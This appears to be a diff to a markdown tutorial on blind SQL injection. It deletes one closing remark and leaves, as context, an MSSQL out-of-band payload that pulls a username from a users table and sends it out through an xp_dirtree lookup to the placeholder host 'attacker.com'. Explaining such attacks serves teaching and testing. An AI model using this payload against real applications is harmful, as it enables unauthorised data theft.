@@ -88,4 +88,3 @@ continue from exploitation process point number 3
   ```sql
   '; DECLARE @data VARCHAR(1024); SELECT @data = (SELECT TOP 1 username FROM users); EXEC('master..xp_dirtree "\\'+@data+'.attacker.com\share"') -- 
   ```
-Remember that Blind SQLi attacks can be time-consuming but are often successful against vulnerable applications that don't properly sanitize input.
